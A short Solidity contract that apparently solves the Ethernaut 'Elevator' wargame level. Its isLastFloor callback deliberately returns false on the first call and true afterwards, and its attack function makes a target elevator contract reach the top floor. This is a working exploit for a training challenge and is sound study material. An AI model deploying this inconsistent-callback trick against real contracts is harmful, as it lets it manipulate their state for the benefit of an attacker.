// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator {
    function goTo(uint256) external;
}

contract Building {
    uint256 public floor = 0;
    uint256 constant ATTACK_FLOOR = 88;

    // Non-Idempotent Function
    function isLastFloor(uint256 _floor) public returns (bool) {
        if (_floor == ATTACK_FLOOR) {
            // first return false
            // others return true
            bool result = (floor == _floor);
            floor = _floor;
            return result;
        }

        return _floor > 99;
    }

    function attack(address _targetContractAddress) public {
        IElevator elevator = IElevator(_targetContractAddress);
        elevator.goTo(ATTACK_FLOOR);
    }
}
